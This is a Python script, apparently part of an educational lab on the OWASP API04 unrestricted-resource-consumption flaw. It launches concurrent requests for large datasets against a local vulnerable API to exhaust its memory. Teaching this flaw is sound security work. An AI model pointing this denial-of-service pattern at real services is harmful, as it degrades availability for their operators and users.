#!/usr/bin/env python3
"""
API04 Unrestricted Resource Consumption - Memory Exhaustion Attack
Educational demonstration of how large responses can exhaust server memory.
"""

import requests
import concurrent.futures

API_URL = "http://localhost:5004"

def fetch_large_dataset(endpoint):
    """Fetch endpoints that return massive datasets"""
    try:
        print(f"Fetching {endpoint}...")
        response = requests.get(f"{API_URL}{endpoint}")
        size_mb = len(response.content) / (1024 * 1024)
        print(f"  Received {size_mb:.2f} MB")
        
        # Keep data in memory
        return response.json()
    except Exception as e:
        print(f"  Error: {e}")
        return None

def memory_attack():
    """Exhaust memory by requesting large datasets concurrently"""
    endpoints = [
        '/api/users',
        '/api/orders',
        '/api/users',
        '/api/orders',
        '/api/users',
        '/api/orders',
    ]
    
    print(f"Requesting {len(endpoints)} large datasets concurrently...")
    print("Monitor memory usage with: docker stats api04-vulnerable-api\n")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(endpoints)) as executor:
        futures = [executor.submit(fetch_large_dataset, ep) for ep in endpoints]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    # Keep all data in memory
    total_records = sum(len(r['data']) if r and 'data' in r else 0 for r in results)
    print(f"\nTotal records in memory: {total_records:,}")

if __name__ == '__main__':
    memory_attack()
